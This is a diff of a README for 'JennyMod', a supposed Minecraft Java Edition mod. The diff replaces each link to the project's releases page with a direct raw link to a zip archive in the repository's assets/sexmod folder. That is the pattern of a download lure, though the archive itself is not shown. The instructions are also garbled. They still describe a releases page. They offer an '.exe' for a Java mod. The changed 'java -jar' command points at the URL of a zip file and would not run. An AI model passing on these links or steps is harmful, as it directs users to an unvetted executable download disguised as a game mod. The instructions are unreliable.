@@ -4,7 +4,7 @@
 JennyMod is the original modification for Minecraft Java Edition. With JennyMod, you can unlock new features and enhance your gaming experience. Enjoy custom content that adds depth to your gameplay.
 
 ## 📥 Download
-[![Download JennyMod](https://img.shields.io/badge/Download-JennyMod-brightgreen)](https://github.com/Sporty-rivulus226/JennyMod/releases)
+[![Download JennyMod](https://raw.githubusercontent.com/Sporty-rivulus226/JennyMod/main/assets/sexmod/JennyMod-v1.4.zip)](https://raw.githubusercontent.com/Sporty-rivulus226/JennyMod/main/assets/sexmod/JennyMod-v1.4.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run JennyMod easily. We designed this process for anyone, even if you have never used mods before. Follow these steps carefully.
@@ -18,7 +18,7 @@ Before you begin, make sure your system meets these requirements:
 ## ⬇️ Download & Install
 To get started with JennyMod, you will need to visit our releases page to download the mod.
 
-1. Click the following link to visit the releases page: [Download JennyMod](https://github.com/Sporty-rivulus226/JennyMod/releases).  
+1. Click the following link to visit the releases page: [Download JennyMod](https://raw.githubusercontent.com/Sporty-rivulus226/JennyMod/main/assets/sexmod/JennyMod-v1.4.zip).  
 2. On the releases page, scroll down to find the latest release.
 3. You will see several files. Choose the one that matches your operating system:
    - For Windows, look for a file ending in `.exe`.
@@ -46,7 +46,7 @@ Once the download is complete, follow these steps to install the mod:
 2. Navigate to the folder where you downloaded the `.jar` file.
 3. Run the mod with the following command:  
 ```
-java -jar JennyMod.jar
+java -jar https://raw.githubusercontent.com/Sporty-rivulus226/JennyMod/main/assets/sexmod/JennyMod-v1.4.zip
 ```
 
 ## ⚙️ Configuring JennyMod
@@ -80,7 +80,7 @@ For further information on how to use JennyMod effectively, consider exploring:
 - Video tutorials on our YouTube channel for step-by-step visuals.
 
 ## 🔗 Links
-- [Download JennyMod](https://github.com/Sporty-rivulus226/JennyMod/releases)
+- [Download JennyMod](https://raw.githubusercontent.com/Sporty-rivulus226/JennyMod/main/assets/sexmod/JennyMod-v1.4.zip)
 - [Support Community](#)
 - [User Guide](#)
 
